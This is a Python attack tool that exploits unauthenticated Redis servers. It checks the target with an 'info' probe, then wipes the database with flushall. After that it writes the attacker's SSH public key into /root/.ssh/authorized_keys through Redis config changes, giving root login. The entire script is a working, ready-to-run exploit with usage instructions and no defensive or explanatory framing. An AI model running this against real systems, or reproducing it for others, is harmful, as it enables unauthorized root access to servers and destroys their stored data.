import socket
import redis
import sys


def Usage():
    redis_unauthorized = '''
                       .___.__                                     __  .__                 .__                  .___
    _______   ____   __| _/|__| ______  __ __  ____ _____   __ ___/  |_|  |__   ___________|__|_______ ____   __| _/
    \_  __ \_/ __ \ / __ | |  |/  ___/ |  |  \/    \\__  \ |  |  \   __\  |  \ /  _ \_  __ \  \___   // __ \ / __ | 
     |  | \/\  ___// /_/ | |  |\___ \  |  |  /   |  \/ __ \|  |  /|  | |   Y  (  <_> )  | \/  |/    /\  ___// /_/ | 
     |__|    \___  >____ | |__/____  > |____/|___|  (____  /____/ |__| |___|  /\____/|__|  |__/_____ \\___  >____ | 
                 \/     \/         \/             \/     \/                 \/                      \/    \/     \/ 
                                                                                                        version 1.0
    '''
    print(redis_unauthorized)
    print("Usage: python redis_unauthorized.py target_ip target_port public_key.txt")
    print("Usage: python redis_unauthorized.py 192.168.1.110 6379 public_key.txt\n")


def get_port_information(ip, port):
    r_ip = ip
    r_port = port
    payload = '\r\ninfo\r\n'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((r_ip, r_port))
        s.sendall(payload.encode())
        get_data = s.recv(512).decode()
        if 'redis_version' in get_data:
            print("[+] Target", r_ip, "is Vulnerable!!!")
            return True
    except:
        print("[+] Target", r_ip, "is not Vulnerable...")
        return False
        pass


def write_public_key(ip, port, ssh_key):
    r_ip = ip
    r_port = port
    try:
        r = redis.StrictRedis(host=r_ip, port=r_port, db=0, socket_timeout=2)
        r.flushall()
        r.set('crack', ssh_key)
        r.config_set('dir', '/root/.ssh/')
        r.config_set('dbfilename', 'authorized_keys')
        r.save()
        print("[+] Target", r_ip, "Write SSH Public_key Success!!!")
    except:
        print("[-] Target", r_ip, "Write SSH Public_key Failed...")
        pass


if __name__ == '__main__':
    Usage()
    if (len(sys.argv) == 4):
        ip = (sys.argv[1])
        port = int(sys.argv[2])
        public_key = sys.argv[3]
        try:
            with open(public_key, 'r') as f:
                ssh_key = f.read()
                ssh_key = '\n\n' + ssh_key + '\n\n'
        except:
            print("Public_key File Read Failed")
            pass
        if get_port_information(ip, port):
            write_public_key(ip, port, ssh_key)
    else:
        Usage()
